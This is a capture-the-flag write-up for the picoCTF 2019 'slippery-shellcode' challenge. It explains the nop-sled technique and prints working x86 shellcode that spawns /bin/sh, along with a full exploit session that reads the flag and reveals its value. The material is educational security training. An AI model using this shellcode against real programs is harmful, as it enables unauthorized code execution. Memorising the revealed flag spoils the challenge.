# picoCTF 2019 - slippery-shellcode
Author: PinkNoize

Binary Exploitation - 200

> This program is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1 on the shell server.

## TL;DR

This challenge provides a program that executes user-supplied shellcode starting at a "random" offset. Provide shellcode with a nop sled to solve.

# Writeup

This challenge is almost identical to [handy-shellcode](handyShellcode.md) with the only difference being that instead of the program jumping to the start of the supplied shellcode, its starts at a "random" offset in the shellcode.

```c
((void (*)())(buf+offset))();
```

We can see that the offset is calculated using a simple equation.

```c
int offset = (rand() % 256) + 1;
```

It starts by getting a "random" number from `rand()` and [modulos](https://en.wikipedia.org/wiki/Modulo_operation) it with 256, then adds 1. This means that 0 < `offset` <= 256. To avoid having the program jump to the middle of our shellcode, we can place it after 256 bytes which will mean that our shellcode will always start at the beginning. As code will still run in the buffer before our shellcode we have to put machine code that will essentially do nothing. The perfect instruction for the job, is `nop`. `Nop`, encoded as 0x90, does nothing except increment the instruction pointer (eip). We can put 256 `nop`s before our shellcode so that when the program jumps to a random place in the start of the buffer, it executes `nop`s until it eventually hits our shellcode. This is known as a [nop sled]().

```gas
nop
nop
nop <- jumps here
nop
.
.
.
nop
<shellcode> <- runs through the nops until it hits here
```
We will be using the same [shellcode](https://www.exploit-db.com/shellcodes/13670) as we used in [handy-shellcode](handyShellcode.md). We can create the payload now ...

```bash
user@pico-2019-shell1:/problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1$ python -c 'print b"\x90"*256 + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"'
�����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
                                                                                                                   [1�1�1Ұ
                                                                                                                         ̀�����/bin/sh
```

We can use the same technique as before to allow us to enter commands after.

```bash
PinkNoize@pico-2019-shell1:/problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1$ (python -c 'print b"\x90"*256 + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"';cat) | ./vuln
Enter your shellcode:
�����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
                                                                                                                   [1�1�1Ұ
                                                                                                                         ̀�����/bin/sh
Thanks! Executing from a random location now...
id  
uid=19100(user) gid=8861(slippery-shellcode_6) groups=8861(slippery-shellcode_6),1002(competitors),19101(user)
cat flag.txt
picoCTF{sl1pp3ry_sh311c0d3_5a0fefb6}
```

We can now read the flag using the elevated permissions.

NOTE: The use of `rand()` in the program is entirely predictable as `srand()` is not used before it. This could eliminate the use of the nop sled by placing the shellcode at the predictable offset. 